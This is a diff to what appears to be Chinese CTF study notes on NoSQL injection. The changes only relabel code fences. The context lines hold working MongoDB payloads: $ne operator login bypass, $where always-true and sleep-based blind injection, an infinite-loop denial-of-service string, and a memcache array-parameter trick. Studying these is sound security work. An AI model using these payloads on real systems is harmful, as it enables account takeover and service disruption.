@@ -486,12 +486,12 @@ payloads='7f454c4602010100000000000000000003003e0001000000d00c000000000000400000
 
 
 
-```nosql
+```text
  题目（无过滤）
  $user = $memcache->get($id);
 ```
 
-```nosql
+```text
 # 访问
 http://xxx/api/?id[]=flag
 
@@ -510,19 +510,19 @@ MongoDB 使用 **BSON 格式** 的数组作为查询条件
 
 - JSON 格式（如果接收 JSON）
 
-  ```nosql
+  ```text
   {"username": {"$ne": null}}
   ```
 
 - URL 编码（如果是 GET/POST）
 
-  ```nosql
+  ```text
   ?data={"username":{"$ne":null}}
   ```
 
 - 数组形式（如果是表单）
 
-  ```nosql
+  ```text
   data[username][$ne]=null
   ```
 
@@ -530,13 +530,13 @@ MongoDB 使用 **BSON 格式** 的数组作为查询条件
 
 - **操作符注入**:攻击者可以注入像 `$ne`（不等于）、`$gt`（大于）、`$regex`（正则匹配）这类查询操作符来彻底改变查询意图。
 
-  ```nosql
+  ```text
   在登录时，将密码字段构造为{"$ne": ""},查询条件就变成了"匹配所有密码不为空的用户"，从而绕过密码验证，实现任意用户登录.
   ```
 
 - **语法注入**:这通常发生在 `$where` 子句中，因为该子句允许执行JavaScript表达式。
 
-  ```nosql
+  ```text
   通过注入 '||1||'x，使 $where 的条件恒为真（||1 始终为真），从而返回所有数据。
   ```
 
@@ -548,7 +548,7 @@ MongoDB 使用 **BSON 格式** 的数组作为查询条件
 | **时间盲注** | `{"$where": "sleep(5000)"}`                              | 若响应延迟，则证明存在注入             |
 | **拒绝服务** | `' && function() { while(1) {} }` 或 `sleep(10000)`      | 制造死循环或长时间阻塞，耗尽服务器资源 |
 
-```nosql
+```text
 username[$ne]=1&password[$ne]=1
 username[$ne]=admin&password[$ne]=1
 #数组形式
